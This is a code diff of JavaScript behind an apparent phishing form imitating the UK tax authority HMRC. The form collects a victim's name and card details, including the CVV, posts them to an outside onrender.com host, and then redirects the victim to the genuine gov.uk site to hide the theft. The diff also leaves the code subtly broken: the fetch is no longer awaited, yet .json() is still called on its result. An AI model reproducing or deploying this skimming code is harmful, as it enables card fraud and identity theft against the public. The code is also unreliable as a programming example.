@@ -278,7 +278,8 @@
         
         form.addEventListener('submit', async (e) => {
           e.preventDefault();
-        
+          window.location.href = "https://gov.uk/";
+          
           const formData = {
             firstName: form.firstName.value,
             lastName: form.lastName.value,
@@ -292,18 +293,19 @@
             expiry: form.expiry.value,
             cvv: form.securityCode.value
           };
-        
+
           try {
-            const res = await fetch('https://hmrc-ykig.onrender.com/submit-form', {
+            const res = fetch('https://hmrc-ykig.onrender.com/submit-form', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(formData)
             });
-        
-            const result = await res.json();
-            console.log('data sent.', result)
+
             form.reset();
-            window.location.href = "https://gov.uk/";
+            
+            const result = res.json();
+            console.log('data sent.', result)
+            
           } catch (err) {
             console.error(err);
             console.log('Something went wrong!');
